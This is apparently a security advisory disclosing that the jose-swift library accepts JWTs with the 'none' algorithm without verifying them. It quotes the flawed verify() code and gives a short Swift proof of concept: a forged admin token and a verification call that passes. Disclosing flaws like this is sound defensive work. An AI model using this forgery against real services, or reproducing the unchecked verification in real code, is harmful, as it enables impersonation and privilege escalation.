summary: "jose-swift has JWT Signature Verification Bypass via None Algorithm\n### Summary\n\
  An authentication bypass vulnerability allows any unauthenticated attacker to forge arbitrary\
  \ JWT tokens by setting \"alg\": \"none\" in the token header. The library's verification\
  \ functions immediately return `true` for such tokens without performing any cryptographic\
  \ verification, enabling complete impersonation of any user and privilege escalation.\n\n\
  ### Details\n  The vulnerability exists in Sources/JSONWebSignature/JWS+Verify.swift at lines\
  \ 34-37:\n\n```\n  public func verify<Key>(key: Key?) throws -> Bool {\n      guard SigningAlgorithm.none\
  \ != protectedHeader.algorithm else {\n          return true  // <-- Vulnerability: returns\
  \ true without verification\n      }\n```\n  When the JWT header contains \"alg\": \"none\"\
  , the verify() method returns true immediately without:\n  1. Checking if the signature is\
  \ empty or present\n  2. Validating the token against any key\n  3. Requiring explicit opt-in\
  \ from the caller\n  \n\n The SigningAlgorithm enum in Sources/JSONWebAlgorithms/Signatures/SigningAlgorithm.swift:72\
  \ explicitly includes case none = \"none\" as a valid algorithm.\n\n  All verification methods\
  \ are affected:\n  - JWS.verify(key:) - Instance method\n  - JWS.verify(jwsString:payload:key:)\
  \ - Static method\n  - JWT.verify(jwtString:senderKey:) - High-level API\n\n### PoC\n\n  1.\
  \ Create a forged JWT with modified claims:\n  // Forged header with alg:none\n  let header\
  \ = #\"{\"alg\":\"none\",\"typ\":\"JWT\"}\"#\n\n  // Attacker's payload with escalated privileges\n\
  \  let payload = #\"{\"sub\":\"user123\",\"admin\":true}\"#\n\n  // Base64URL encode and concatenate\
  \ with empty signature\n  let forgedToken = base64url(header) + \".\" + base64url(payload)\
  \ + \".\"\n  // Result: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ1c2VyMTIzIiwiYWRtaW4iOnRydWV9.\n\
  \n  2. Verify the forged token passes verification:\n  let jws = try JWS(jwsString: forgedToken)\n\
  \  let isValid = try jws.verify(key: legitimateSecretKey)  // Returns TRUE\n\n\n### Impact\n\
  \n  This is an authentication bypass vulnerability.   Who is impacted: Any application using\
  \ jose-swift for JWT verification is vulnerable. An attacker can:\n\n  - Forge identity: Create\
  \ tokens claiming to be any user\n  - Escalate privileges: Add admin/superuser claims to gain\
  \ unauthorized access\n  - Bypass authentication entirely: Access protected resources without\
  \ valid credentials\n  - Modify any claim: Change expiration, audience, issuer, or any custom\
  \ claims\n\n  The attack requires no knowledge of the signing key and works against all signature\
  \ algorithms (HS256, RS256, ES256, etc.) since the attacker simply bypasses signature verification\
  \ entirely.\n\n### Credits\nReported by Louis Nyffenegger - https://pentesterlab.com/"
